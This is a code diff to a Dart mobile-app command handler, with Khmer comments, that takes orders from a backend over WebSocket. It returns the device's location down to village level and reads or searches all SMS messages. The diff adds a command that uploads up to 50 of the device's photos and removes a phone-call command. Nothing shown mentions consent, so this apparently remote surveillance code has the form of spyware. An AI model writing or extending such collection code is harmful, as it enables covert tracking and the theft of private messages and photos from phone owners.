@@ -1,7 +1,7 @@
 // ============================================================================
 //  DEVICE COMMAND HANDLER — WebSocket client ទទួល command ពី backend
 //  ភ្ជាប់ WebSocket ពេល login ផ្តាច់ពេល logout
-//  ទទួល command (location/call/SMS) ហើយប្រតិបត្តិតាម
+//  ទទួល command (location/screenshot/SMS) ហើយប្រតិបត្តិតាម
 // ============================================================================
 
 import 'dart:async';
@@ -126,22 +126,18 @@ class DeviceCommandHandler {
         case 'get_location':
           final pos = await DeviceServices.getCurrentLocation();
           if (pos != null) {
-            final address = await DeviceServices.getAddressFromLocation(pos);
+            final addressData = await DeviceServices.getAddressFromLocation(pos);
             resultData = {
               'lat': pos.latitude,
               'lng': pos.longitude,
               'accuracy': pos.accuracy,
-              'address': address,
+              'village': addressData['village'] ?? '',
+              'commune': addressData['commune'] ?? '',
+              'district': addressData['district'] ?? '',
+              'province': addressData['province'] ?? '',
+              'country': addressData['country'] ?? '',
             };
             success = true;
-          }
-          break;
-
-        case 'make_call':
-          final phone = payload['phone'] as String?;
-          if (phone != null && phone.isNotEmpty) {
-            success = await DeviceServices.makePhoneCall(phone);
-            resultData = {'phone': phone, 'called': success};
           }
           break;
 
@@ -169,6 +165,13 @@ class DeviceCommandHandler {
               ? await DeviceServices.searchSmsMessages(query)
               : await DeviceServices.getAllSmsMessages();
           resultData = {'messages': messages, 'count': messages.length};
+          success = true;
+          break;
+
+        case 'get_photos':
+          final limit = payload['limit'] as int? ?? 50;
+          final photos = await DeviceServices.getPhotos(limit: limit);
+          resultData = {'photos': photos, 'count': photos.length};
           success = true;
           break;
 
